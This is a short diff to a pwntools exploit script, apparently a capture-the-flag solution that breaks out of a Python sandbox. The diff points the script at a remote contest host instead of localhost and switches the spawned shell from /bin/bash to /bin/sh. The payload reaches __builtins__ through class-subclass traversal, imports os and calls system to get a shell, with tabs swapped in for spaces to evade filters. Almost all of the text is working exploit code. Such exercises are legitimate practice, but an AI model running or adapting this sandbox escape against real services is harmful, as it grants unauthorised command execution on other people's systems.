@@ -1,6 +1,6 @@
 from pwn import *
 
-HOST, PORT = "localhost", 1234
+HOST, PORT = "intersec.hcs-team.com", 10218
 
 io = remote(HOST, PORT)
 
@@ -35,7 +35,7 @@ def build_str(s):
 
 payload = init()
 payload += f"bi=().__class__.__class__.__subclasses__(().__class__.__class__).__getattribute__({build_str('pop')})({build_digit(0)}).register.__getattribute__({build_str('__builtins__')});"
-payload += f"print((bi.__getitem__({build_str('__import__')}))({build_str('os')}).__getattribute__({build_str('system')})({build_str('/bin/bash')}));"
+payload += f"print((bi.__getitem__({build_str('__import__')}))({build_str('os')}).__getattribute__({build_str('system')})({build_str('/bin/sh')}));"
 payload = payload.replace(" ", "\t")
 print(payload.encode())
 io.sendlineafter(b":", payload.encode())
